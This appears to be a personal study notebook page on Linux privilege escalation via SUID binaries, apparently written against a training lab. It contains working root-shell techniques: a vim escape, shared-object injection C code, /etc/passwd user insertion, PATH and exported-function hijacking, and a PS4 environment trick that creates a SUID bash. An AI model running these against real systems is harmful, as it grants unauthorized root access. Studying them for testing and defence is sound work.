SUID Is *Set Owner User ID*. It's A *Special Permission For Linux Files*. Go See Your Notes For More Info.

To Search For *SUID Set Files On Linux*, Run This Command :-

```sh
find / -type f -perm -4000 2>/dev/null
```
OR
```sh
find / -perm -u=s -type f 2>/dev/null
```


![[Pasted image 20220813134045.png]]

Then, Go To [[GTFOBins]] For *Privilege Escalation*.

##### vim.basic Priv Escalation
```sh
/usr/bin/vim.basic

# Get to the ":" section and then:-
:py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")          # Don't put ":"

# then when it asks for Terminal type?, put xterm
```


---
# Shared Object Injection
If a command tries to open a `.so` file & it can be *written*, it's vulnerable to SO Injection.
To find out :-
```sh
# Replace /usr/local/bin/suid-so with your file
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
strace -e trace=file /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

![[Pasted image 20231031201505.png]]
The <mark style="background: #FF5582A6;">Highlighted</mark> folder is writable!

So, create the folders first:-
```sh
mkdir /home/user/.config
```

Make a new file in that folder :-
```C
// libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
OR
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
system(“cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p”);
}
```

```sh
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
```sh
/usr/local/bin/suid-so
```


---
# Privilege Escalation with nano/base64
1) **Using unshadow command & break password hashes**
#unshadow 


2) **Using openssl**
![[Pasted image 20230520133150.png]]
- Add this password with a username to the `/etc/passwd` file.
![[Pasted image 20230520133224.png]]
- Once our user is added (*please note* how `root:/bin/bash` was *used to provide a root shell*) we will need to switch to this user and hopefully should have root privileges.

---
# Priv Esc with Non-Standard Linux Command
## Relative Path Abuse
Go on **ChatGPT** & place all the commands with SUID Bit **Set**. If you find a non-standard Linux Command, Check what the command is doing.

Ex: Here we have, `/usr/bin/menu`
Using **strings** on it we see :-
![[Pasted image 20230616174104.png]]

Command runs `curl` when `1` is pressed, `uname` when `2` is pressed, `ifconfig` when `3` is pressed.

So we **abuse** the [[Path]] Variable so that `/tmp` is the first directory from where these *commands run*.
![[Pasted image 20230616174432.png]]

We copied the `/bin/sh` shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the `/usr/bin/menu` binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of `/usr/sh`, as well as this file being run as root it runs our shell as root!

#### Another Method
```C
// If SUID command is calling service
// service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
```sh
gcc -o service /home/user/tools/suid/service.c
```


## Absolute Path Abuse
In Bash versions `<4.2-048` it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
```sh
/bin/bash --version
```

**Example**
```sh
strings /usr/local/bin/suid-env2

# Output
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

Create a Bash function with the name `/usr/sbin/service` that executes a new Bash shell (using `-p` so permissions are preserved) and export the function:
```sh
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

# OR

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

---
# Shell Feature Abuse
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```